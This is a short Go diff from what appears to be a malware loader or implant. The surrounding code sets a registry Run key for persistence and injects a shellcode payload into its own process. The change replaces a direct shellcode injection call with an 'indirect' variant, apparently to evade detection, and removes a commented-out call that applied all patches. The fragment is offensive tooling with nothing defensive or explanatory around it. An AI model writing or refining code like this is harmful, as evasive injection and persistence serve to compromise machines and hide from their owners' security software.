@@ -722,9 +722,7 @@ func main() {
 		winapi.CreateRunKey()
 		// Self-injection
 		debug.Printfln("MAIN", "Injecting payload into current process (self-injection)\n")
-		// apply all patches here because fuck it we fixed it
-		// winapi.ApplyAllPatches()
-		err = winapi.NtInjectSelfShellcode(payload)
+		err = winapi.NtInjectSelfShellcodeIndirect(payload)
 		
 		if err != nil {
 			debug.Printfln("MAIN", "Self-injection failed: %v\n", err)
